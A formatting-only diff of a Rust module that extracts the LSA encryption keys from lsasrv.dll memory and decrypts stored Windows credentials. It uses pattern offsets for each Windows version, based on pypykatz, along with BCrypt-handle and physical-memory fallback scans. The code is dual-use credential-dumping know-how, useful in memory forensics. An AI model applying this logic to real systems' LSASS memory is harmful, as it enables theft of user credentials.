@@ -3,8 +3,8 @@ use cbc::cipher::{BlockDecryptMut, KeyIvInit};
 use des::TdesEde3;
 
 use crate::error::{GovmemError, Result};
-use crate::memory::VirtualMemory;
 use crate::lsass::patterns;
+use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
 type Aes128CbcDec = cbc::Decryptor<Aes128>;
@@ -22,13 +22,13 @@ pub struct CryptoKeys {
 /// Each set: (iv_disp_offset, des_disp_offset, aes_disp_offset) relative to pattern start.
 /// Based on pypykatz LSA templates.
 const KEY_OFFSET_SETS: &[(i64, i64, i64)] = &[
-    (67, -89, 16),  // LSA_x64_6: Win10 1809+ / Win11
-    (61, -73, 16),  // LSA_x64_5: Win10 1507-1607
-    (71, -89, 16),  // LSA_x64_9: Win11 22H2+
-    (58, -89, 16),  // LSA_x64_8: Win11 early
-    (62, -74, 23),  // LSA_x64_3: Win8.1 / Server 2012 R2
-    (59, -61, 23),  // LSA_x64_1: Win7 / Server 2008 R2
-    (62, -70, 23),  // LSA_x64_2: Win8 / Server 2012
+    (67, -89, 16), // LSA_x64_6: Win10 1809+ / Win11
+    (61, -73, 16), // LSA_x64_5: Win10 1507-1607
+    (71, -89, 16), // LSA_x64_9: Win11 22H2+
+    (58, -89, 16), // LSA_x64_8: Win11 early
+    (62, -74, 23), // LSA_x64_3: Win8.1 / Server 2012 R2
+    (59, -61, 23), // LSA_x64_1: Win7 / Server 2008 R2
+    (62, -70, 23), // LSA_x64_2: Win8 / Server 2012
 ];
 
 /// Extract IV, 3DES key, and AES key from lsasrv.dll.
@@ -53,7 +53,10 @@ pub fn extract_crypto_keys(
 
     log::info!(
         "lsasrv PE: base=0x{:x}, .text VA=0x{:x}, .text size=0x{:x}, text_base=0x{:x}",
-        lsasrv_base, text.virtual_address, text_size, text_base
+        lsasrv_base,
+        text.virtual_address,
+        text_size,
+        text_base
     );
 
     // Find the key initialization pattern
@@ -68,7 +71,10 @@ pub fn extract_crypto_keys(
     let (pattern_addr, _pat_idx) = match pattern_result {
         Ok(result) => result,
         Err(e) => {
-            log::info!("Key pattern not found in .text ({}), trying .data section fallback...", e);
+            log::info!(
+                "Key pattern not found in .text ({}), trying .data section fallback...",
+                e
+            );
             return extract_crypto_keys_data_fallback(vmem, lsasrv_base);
         }
     };
@@ -77,7 +83,10 @@ pub fn extract_crypto_keys(
     for (set_idx, &(iv_off, des_off, aes_off)) in KEY_OFFSET_SETS.iter().enumerate() {
         log::info!(
             "Trying offset set {} (IV={}, DES={}, AES={})",
-            set_idx, iv_off, des_off, aes_off
+            set_idx,
+            iv_off,
+            des_off,
+            aes_off
         );
 
         // Resolve RIP-relative addresses for each global
@@ -127,13 +136,24 @@ pub fn extract_crypto_keys(
             continue;
         }
         if aes_key.len() != 16 && aes_key.len() != 32 {
-            log::info!("  Invalid AES key length: {} (expected 16 or 32)", aes_key.len());
+            log::info!(
+                "  Invalid AES key length: {} (expected 16 or 32)",
+                aes_key.len()
+            );
             continue;
         }
 
-        log::info!("Crypto keys extracted: 3DES={} bytes, AES={} bytes", des_key.len(), aes_key.len());
+        log::info!(
+            "Crypto keys extracted: 3DES={} bytes, AES={} bytes",
+            des_key.len(),
+            aes_key.len()
+        );
 
-        return Ok(CryptoKeys { iv, des_key, aes_key });
+        return Ok(CryptoKeys {
+            iv,
+            des_key,
+            aes_key,
+        });
     }
 
     // All offset sets failed (likely .data pages paged out → globals read as 0).
@@ -165,7 +185,8 @@ fn extract_crypto_keys_data_fallback(
 
     log::info!(
         "Scanning lsasrv .data section for BCrypt handles: base=0x{:x}, size=0x{:x}",
-        data_base, data_size
+        data_base,
+        data_size
     );
 
     let data = vmem.read_virt_bytes(data_base, data_size)?;
@@ -208,7 +229,9 @@ fn extract_crypto_keys_data_fallback(
         if let Ok(key_bytes) = extract_bcrypt_key(vmem, handle_addr) {
             log::info!(
                 "Found BCrypt key handle at .data+0x{:x} (VA 0x{:x}): {} bytes",
-                off, handle_addr, key_bytes.len()
+                off,
+                handle_addr,
+                key_bytes.len()
             );
             key_handles.push((off as u64, key_bytes));
         }
@@ -252,10 +275,16 @@ fn extract_crypto_keys_data_fallback(
 
     log::info!(
         "Crypto keys extracted via .data fallback: 3DES={} bytes, AES={} bytes, IV={}",
-        des_key.len(), aes_key.len(), hex::encode(&iv)
+        des_key.len(),
+        aes_key.len(),
+        hex::encode(&iv)
     );
 
-    Ok(CryptoKeys { iv, des_key, aes_key })
+    Ok(CryptoKeys {
+        iv,
+        des_key,
+        aes_key,
+    })
 }
 
 /// Find the InitializationVector in .data near the BCrypt handle globals.
@@ -298,7 +327,11 @@ fn find_iv_near_handles(
             continue; // too uniform
         }
 
-        log::debug!("IV candidate at .data+0x{:x}: {}", off, hex::encode(candidate));
+        log::debug!(
+            "IV candidate at .data+0x{:x}: {}",
+            off,
+            hex::encode(candidate)
+        );
         return Ok(candidate.to_vec());
     }
 
@@ -316,54 +349,68 @@ fn find_iv_near_handles(
 fn extract_bcrypt_key(vmem: &impl VirtualMemory, handle_addr: u64) -> Result<Vec<u8>> {
     let handle_ptr = vmem.read_virt_u64(handle_addr)?;
     if handle_ptr == 0 || handle_ptr < 0x10000 {
-        return Err(GovmemError::DecryptionError(
-            format!("Invalid BCrypt handle pointer: 0x{:x}", handle_ptr),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Invalid BCrypt handle pointer: 0x{:x}",
+            handle_ptr
+        )));
     }
     // Validate canonical address
     let high = handle_ptr >> 48;
     if high != 0 && high != 0xFFFF {
-        return Err(GovmemError::DecryptionError(
-            format!("Non-canonical BCrypt handle pointer: 0x{:x}", handle_ptr),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Non-canonical BCrypt handle pointer: 0x{:x}",
+            handle_ptr
+        )));
     }
 
     log::debug!("  BCrypt handle ptr: 0x{:x}", handle_ptr);
 
     // Read BCRYPT_HANDLE_KEY structure
     let handle_tag = vmem.read_virt_u32(handle_ptr + 0x04)?;
-    log::debug!("  BCrypt handle tag: 0x{:08x} ('{}')", handle_tag, tag_to_str(handle_tag));
+    log::debug!(
+        "  BCrypt handle tag: 0x{:08x} ('{}')",
+        handle_tag,
+        tag_to_str(handle_tag)
+    );
 
     // Read key pointer at +0x10 (standard offset for BCRYPT_HANDLE_KEY.key)
     let key_ptr = vmem.read_virt_u64(handle_ptr + 0x10)?;
     if key_ptr == 0 || key_ptr < 0x10000 {
-        return Err(GovmemError::DecryptionError(
-            format!("Invalid BCrypt key pointer at handle+0x10: 0x{:x}", key_ptr),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Invalid BCrypt key pointer at handle+0x10: 0x{:x}",
+            key_ptr
+        )));
     }
     let key_high = key_ptr >> 48;
     if key_high != 0 && key_high != 0xFFFF {
-        return Err(GovmemError::DecryptionError(
-            format!("Non-canonical BCrypt key pointer: 0x{:x}", key_ptr),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Non-canonical BCrypt key pointer: 0x{:x}",
+            key_ptr
+        )));
     }
 
     log::debug!("  BCrypt key ptr: 0x{:x}", key_ptr);
 
     // Read BCRYPT_KEY / BCRYPT_KEY81 structure
     let key_tag = vmem.read_virt_u32(key_ptr + 0x04)?;
-    log::debug!("  BCrypt key tag: 0x{:08x} ('{}')", key_tag, tag_to_str(key_tag));
+    log::debug!(
+        "  BCrypt key tag: 0x{:08x} ('{}')",
+        key_tag,
+        tag_to_str(key_tag)
+    );
 
     // Try BCRYPT_KEY81 layout (Win 8.1+): hardkey at offset 0x38
     // Then try BCRYPT_KEY layout (older): hardkey at offset 0x18
     for &hardkey_offset in &[0x38u64, 0x18] {
         let cb_secret = vmem.read_virt_u32(key_ptr + hardkey_offset)?;
         if cb_secret == 16 || cb_secret == 24 || cb_secret == 32 {
-            let key_data = vmem.read_virt_bytes(key_ptr + hardkey_offset + 4, cb_secret as usize)?;
+            let key_data =
+                vmem.read_virt_bytes(key_ptr + hardkey_offset + 4, cb_secret as usize)?;
             if key_data.iter().any(|&b| b != 0) {
                 log::debug!(
                     "  Found key at key_obj+0x{:x}: {} bytes",
-                    hardkey_offset, cb_secret
+                    hardkey_offset,
+                    cb_secret
                 );
                 return Ok(key_data);
             }
@@ -376,10 +423,7 @@ fn extract_bcrypt_key(vmem: &impl VirtualMemory, handle_addr: u64) -> Result<Vec
         if val == 16 || val == 24 || val == 32 {
             let key_data = vmem.read_virt_bytes(key_ptr + offset + 4, val as usize)?;
             if key_data.iter().any(|&b| b != 0) {
-                log::debug!(
-                    "  Fallback: key at key_obj+0x{:x}: {} bytes",
-                    offset, val
-                );
+                log::debug!("  Fallback: key at key_obj+0x{:x}: {} bytes", offset, val);
                 return Ok(key_data);
             }
         }
@@ -456,7 +500,10 @@ pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
                 if data.iter().any(|&b| b != 0) {
                     log::info!(
                         "Physical scan: key at UUUR 0x{:x} → key_obj 0x{:x}+0x{:x}: {} bytes",
-                        handle_va, key_ptr, hardkey_off, cb_secret,
+                        handle_va,
+                        key_ptr,
+                        hardkey_off,
+                        cb_secret,
                     );
                     extracted_keys.push((handle_va, data));
                     break;
@@ -465,7 +512,10 @@ pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
         }
     }
 
-    log::info!("Physical scan extracted {} keys from UUUR handles", extracted_keys.len());
+    log::info!(
+        "Physical scan extracted {} keys from UUUR handles",
+        extracted_keys.len()
+    );
 
     if extracted_keys.len() < 2 {
         return Err(GovmemError::PatternNotFound(format!(
@@ -547,7 +597,10 @@ pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
                         continue; // looks like a pointer
                     }
                     let val2 = u64::from_le_bytes(candidate[8..16].try_into().unwrap());
-                    if val2 > 0x10000 && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF) && val2 & 0x7 == 0 {
+                    if val2 > 0x10000
+                        && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF)
+                        && val2 & 0x7 == 0
+                    {
                         continue;
                     }
                     let unique: std::collections::HashSet<u8> = candidate.iter().copied().collect();
@@ -578,18 +631,25 @@ pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
         aes_key.len()
     );
 
-    Ok(CryptoKeys { iv, des_key, aes_key })
+    Ok(CryptoKeys {
+        iv,
+        des_key,
+        aes_key,
+    })
 }
 
 fn tag_to_str(tag: u32) -> String {
     let bytes = tag.to_le_bytes();
-    bytes.iter().map(|&b| {
-        if b.is_ascii_alphanumeric() || b == b'_' {
-            b as char
-        } else {
-            '.'
-        }
-    }).collect()
+    bytes
+        .iter()
+        .map(|&b| {
+            if b.is_ascii_alphanumeric() || b == b'_' {
+                b as char
+            } else {
+                '.'
+            }
+        })
+        .collect()
 }
 
 /// Decrypt an encrypted credential blob.
@@ -616,9 +676,10 @@ pub fn decrypt_credential(keys: &CryptoKeys, encrypted: &[u8]) -> Result<Vec<u8>
 
 fn decrypt_3des_cbc(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
     if key.len() != 24 {
-        return Err(GovmemError::DecryptionError(
-            format!("Invalid 3DES key length: {} (expected 24)", key.len()),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Invalid 3DES key length: {} (expected 24)",
+            key.len()
+        )));
     }
     let mut buf = data.to_vec();
     let decryptor = Des3CbcDec::new_from_slices(key, iv)
@@ -685,9 +746,10 @@ pub fn decrypt_unicode_string_password(
 
 fn decrypt_aes_cbc(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
     if key.len() != 16 && key.len() != 32 {
-        return Err(GovmemError::DecryptionError(
-            format!("Invalid AES key length: {} (expected 16 or 32)", key.len()),
-        ));
+        return Err(GovmemError::DecryptionError(format!(
+            "Invalid AES key length: {} (expected 16 or 32)",
+            key.len()
+        )));
     }
     let mut buf = data.to_vec();
     let decryptor = Aes128CbcDec::new_from_slices(key, iv)
